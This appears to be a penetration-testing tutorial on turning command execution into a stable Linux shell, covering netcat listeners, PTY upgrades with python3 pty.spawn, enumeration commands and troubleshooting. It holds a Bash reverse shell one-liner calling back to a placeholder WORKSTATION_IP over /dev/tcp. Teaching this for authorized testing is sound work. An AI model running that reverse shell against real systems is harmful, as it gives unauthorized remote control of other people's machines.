## Current operation: Give an existing Linux shell a pseudo-terminal

**Run in:** Linux target, then the local Kali terminal. **Requires:** A live Linux command stream, Python 3 on the target and an interactive local terminal with job control; measure the local stty size first, substitute ROWS and COLUMNS, and follow the location changes one step at a time.

```bash
# In the remote shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl-Z to suspend the local connection. At the local terminal:
stty raw -echo; fg
# Press Enter, then in the resumed remote shell:
export TERM=xterm
export SHELL=/bin/bash
stty rows ROWS columns COLUMNS
```

**Read the result:** A successful upgrade gives usable terminal input, signals and job control; test these before running an interactive program.

**If Echo, signals or terminal size are wrong after resuming:** The local terminal's raw mode and the remote pseudo-terminal are separate steps; restoring terminal state matters when a session exits.

**Next check:** Set the remote stty rows and columns to match the local terminal; after disconnecting restore the local terminal with stty sane or reset.

**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.

## Turn execution into a usable session

First establish that a simple command runs and identify the account. Then choose a session method that matches the target OS, installed programs, network direction and required interactivity. A shell connection, an elevated token and a stable terminal are different milestones.

### Establish execution and network context

```bash
# Linux target:
id
uname -a
command -v bash python3 nc curl
ip route
```

```powershell
# Windows target:
whoami
whoami /priv
$PSVersionTable.PSVersion
ipconfig
```

Keep command output with the application/process that executed it. A web server worker and an interactive user session may have different accounts, environment variables, permissions and network access.

### Prepare and test the receiving side

```bash
# Workstation:
nc -lvnp 4444
ip -br addr
ss -lntp
```

Use an address reachable from the target, often the lab/VPN interface rather than a local desktop network. A listener is only one side of the path; a target's outbound filtering or route can prevent the callback.

### Use the target's actual shell syntax

```bash
# Linux target, explicitly using Bash:
bash -c 'bash -i >& /dev/tcp/WORKSTATION_IP/4444 0>&1'
```

This relies on Bash behavior and a permitted TCP path. If the entry point applies URL, JSON or form encoding, account for that transport separately from shell quoting. Do not assume a command that works in a terminal can be pasted unchanged into every web parameter.

For Windows, use the platform-specific payload examples below or the Windows reverse-shell tool page. Match staged/stageless payload choice, architecture and handler settings if using a framework. A raw Netcat listener is not a substitute for every specialized handler.

### Upgrade a Linux terminal deliberately

```bash
# In the received remote shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Suspend the local foreground Netcat process with Ctrl-Z, record the local terminal dimensions, then put that local terminal into raw mode and resume the connection:

```bash
# Local workstation terminal after Ctrl-Z:
stty size
stty raw -echo; fg
```

```bash
# Remote shell: use the rows/columns reported by the local terminal.
stty rows ROWS columns COLUMNS
```

Test input, job control and an interactive command. If the session exits and the local terminal becomes unreadable, restore it with `stty sane` or `reset` in that local terminal.

### Diagnose the missing milestone

| Result | Next investigation |
| --- | --- |
| Simple command fails | Injection/quoting, process context and available binary |
| Command works, no callback | Listener bind, reachable callback IP, port, egress and payload syntax |
| TCP connects then exits | Payload/handler mismatch, process lifetime, stdin/stdout handling |
| Shell works but interactive program fails | PTY, terminal mode, dimensions and environment |
| Shell works but admin command fails | Actual user, groups, privileges and elevation |
| Shell disappears with request | Parent process lifetime and the execution mechanism |

Keep a stable authorized session before moving to local enumeration or transfers. Record the exact successful method so a later tunnel or privilege step is not blamed for a fragile initial shell.

### Fully stabilising a shell (the upgrade you'll use constantly)

**Shells, Payloads, and Interactive TTYs**

```bash
# 1. On the TARGET shell — spawn a proper PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell: press Ctrl-Z (drops you back to your LOCAL terminal)

# 3. On YOUR box — set the local terminal to raw and re-foreground the shell
stty raw -echo; fg
#   stty raw -echo = stop the local terminal from intercepting keys/signals
#   fg             = bring the backgrounded remote shell back (press Enter once or twice)

# 4. Back on the TARGET — declare your terminal type and size so editors/clear work
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 116        # use your real size — check with `stty size` locally first
```
